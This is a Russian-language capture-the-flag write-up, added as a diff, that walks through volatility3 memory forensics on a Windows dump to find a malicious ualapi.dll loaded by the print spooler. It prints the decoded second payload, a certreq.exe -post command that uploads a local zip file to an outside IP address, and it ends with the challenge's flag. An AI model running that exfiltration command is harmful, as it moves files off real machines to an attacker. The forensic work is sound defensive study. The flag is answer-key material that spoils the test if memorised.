@@ -1,0 +1,31 @@
+Решение при помощи volatility3:
+
+1. Исследуем дамп:
+	* Получаем дерево процессов: 	python3 vol.py -f 80808 windows.pstree
+		!шедулер запускает powershell
+		!из под сервиса спулера запущен rundll32
+
+	* Получаем команды:				python3 vol.py -f 80808 windows.cmdline
+		!powershell перезапускает сервис спулера
+
+	* Получаем коннекты:			python3 vol.py -f 80808 windows.netscan
+		!SYN_SENT на адрес 192.80.11.30:3390
+
+	(*) Делаем малфайнд:			python3 vol.py -f 80808 windows.malfind
+		!rundll32
+
+2. Проверяем dll spoolsv:			python3 vol.py -f 80808 windows.dlllist --pid 1992
+
+3. Получаем образы dll из памяти:	python3 vol.py -f 80808 windows.filescan
+									python3 vol.py -f 80808 windows.dumpfiles --physaddr *адреса dll*
+
+4. Понять, какой из dll вредоносный:
+	* Оценить соразмерность с оригиналом
+	* Посмотреть содержимое вручную
+	* Найти адрес (0d3e c0500b1e) grepом по образам
+		!ualapi.dll вредоносный
+
+5. Найти в ualapi.dll второй пейлоад в base64, раздекодить:
+		!certreq.exe -post -config https://192.80.11.30:80/ c:/users/admin/desktop/utils/c51129468a59c5acba0f0ef6f3b463a0c6ee2e81c6fc9511438fb4930dd0fd.zip
+
+6. Флаг: CUP{c51129468a59c5acba0f0ef6f3b463a0c6ee2e81c6fc9511438fb4930dd0fd}
